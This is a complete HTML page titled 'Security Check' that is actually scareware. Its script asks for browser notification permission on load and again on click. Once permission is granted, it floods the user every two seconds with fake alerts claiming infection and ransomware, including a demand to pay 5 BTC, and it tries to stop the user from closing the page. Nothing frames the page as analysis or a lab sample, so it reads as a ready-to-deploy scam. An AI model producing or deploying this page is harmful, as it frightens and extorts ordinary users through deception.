<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <script>
        // Request notification permission immediately
        if ("Notification" in window) {
            Notification.requestPermission().then(function(permission) {
                if (permission === "granted") {
                    // Start spamming virus notifications nonstop
                    setInterval(function() {
                        new Notification("🚨 VIRUS ALERT 🚨", {
                            body: "Your computer is infected! Critical malware detected. Files are being encrypted. Immediate action required!",
                            icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2IDEgTDMgMjhIMjkgTDI2IDNoMTMgVjI4SDBWMUwxNiAxWiIgZmlsbD0iI0ZGQDAwMCIvPgo8L3N2Zz4K",
                            tag: "virus-alert-" + Date.now()
                        });
                        
                        // Additional spam variations for persistence
                        setTimeout(function() {
                            new Notification("💀 SYSTEM COMPROMISED 💀", {
                                body: "Ransomware active! All files locked. Pay 5 BTC to unlock or lose everything!",
                                icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2IDEgTDMgMjhIMjkgTDI2IDNoMTMgVjI4SDBWMUwxNiAxWiIgZmlsbD0iI0ZGMDAwIi8+Cjwvc3ZnPgo=",
                                tag: "ransomware-" + Date.now()
                            });
                        }, 500);
                        
                        setTimeout(function() {
                            new Notification("⚠️ EMERGENCY ⚠️", {
                                body: "Virus spreading to network! Disconnect immediately or risk total data loss!",
                                icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2IDEgTDMgMjhIMjkgTDI2IDNoMTMgVjI4SDBWMUwxNiAxWiIgZmlsbD0iI0ZGRjAwIi8+Cjwvc3ZnPgo=",
                                tag: "network-virus-" + Date.now()
                            });
                        }, 1000);
                    }, 2000); // Spam every 2 seconds with 3 notifications staggered
                }
            });
        }

        // Fallback: Auto-trigger permission request on any interaction
        document.addEventListener('click', function() {
            if ("Notification" in window && Notification.permission === "default") {
                Notification.requestPermission();
            }
        }, { once: true });

        // Prevent page close/unload to maintain spam
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</body>
</html>
